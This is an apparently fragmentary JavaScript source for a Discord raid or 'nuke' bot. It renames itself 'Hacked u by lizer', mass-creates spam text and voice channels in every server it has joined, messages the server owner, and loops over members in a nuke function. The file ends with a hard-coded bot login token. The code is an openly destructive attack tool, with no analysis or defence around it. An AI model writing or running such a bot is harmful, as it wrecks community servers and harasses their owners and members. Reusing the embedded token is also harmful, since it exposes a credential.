...
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setUsername("Hacked u by lizer")
 
}
});
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setGame(`Hacked u by lizer`,'https://www.twitch.tv/hix')
...
LOka.on('message', message => {
         if (message.content === "1") {
               LOka.guilds.forEach(m =>{
m.createChannel('Hacked u by lizer', 'text');
m.createChannel('Hacked u by lizer', 'text');
m.createChannel('Hacked u by lizer', 'text');
m.createChannel('Hacked u by lizer', 'text');
m.createChannel('Hacked u by lizer', 'text');
...
LOka.on('message', message => {
         if (message.content === "3") {
                 LOka.guilds.forEach(m =>{
m.createChannel('Hacked u by lizer', 'voice');
m.createChannel('Hacked u by lizer', 'voice');
m.createChannel('Hacked u by lizer', 'voice');
m.createChannel('Hacked u by lizer', 'voice');
m.createChannel('Hacked u by lizer', 'voice');
...
async function nuke(guild) {
  ...
  await guild.owner.send(' Hacked u by lizer').catch(e => { return void e; });
  ...
  await Promise.all(guild.members.map(async (m) => {
    ...
    await guild.createChannel('Hacked u by lizer', 'text');
 
      await guild.createChannel('Hacked u by lizer', 'voice');
...
LOka.login ("NTE0Mzc4NjQ5MjI3NzU1NTIx.XSzovQ.iPDbHf6VfEaNnqo9DNC9WDdl0Qc")
